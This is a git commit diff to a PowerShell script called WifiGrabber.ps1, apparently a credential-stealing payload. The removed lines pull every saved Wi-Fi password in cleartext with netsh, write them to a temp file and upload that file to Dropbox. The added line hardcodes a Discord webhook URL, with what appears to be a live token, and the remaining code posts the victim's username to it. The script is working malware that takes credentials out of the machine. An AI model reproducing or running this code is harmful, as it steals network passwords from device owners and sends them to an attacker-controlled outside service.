1d33fa07f3c3bdb5ac2661adafb73e200e64a319
mphillipsxassembly <73129138+mphillipsxassembly@users.noreply.github.com>
2023-06-07 16:50:52 -0600

    Update WifiGrabber.ps1

--- WifiGrabber.ps1
+++ WifiGrabber.ps1
@@ -1,35 +1,3 @@
-############################################################################################################################################################
-
-$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
-
-
-$wifiProfiles > $env:TEMP/--wifi-pass.txt
-
-############################################################################################################################################################
-
-# Upload output file to Dropbox
-
-function DropBox-Upload {
-
-[CmdletBinding()]
-param (
-	
-[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
-[Alias("f")]
-[string]$SourceFilePath
-) 
-$outputFile = Split-Path $SourceFilePath -leaf
-$TargetFilePath="/$outputFile"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $db
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-}
-
-if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TEMP/--wifi-pass.txt}
 
 ############################################################################################################################################################
 
@@ -43,7 +11,7 @@ param (
     [string]$text 
 )
 
-$hookurl = "$dc"
+$hookurl = "https://discordapp.com/api/webhooks/1111728682386599976/xvqIY6IVhqgNBbel3XgYlHMzDOq51T4lJGY79TrB91XCwn3uHHvyA5h12c4C-4lQseKQ"
 
 $Body = @{
   'username' = $env:username
